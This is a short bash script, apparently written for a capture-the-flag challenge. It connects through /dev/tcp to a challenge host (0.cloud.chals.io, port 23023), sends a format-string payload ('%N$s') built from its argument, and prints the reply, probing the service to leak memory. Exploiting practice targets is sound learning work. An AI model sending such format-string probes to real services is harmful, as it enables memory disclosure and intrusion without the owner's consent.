#!/bin/bash
p="$1"
exec 3<>/dev/tcp/0.cloud.chals.io/23023
printf '%%%s$s|END\n' "$p" >&3
timeout 3 cat <&3
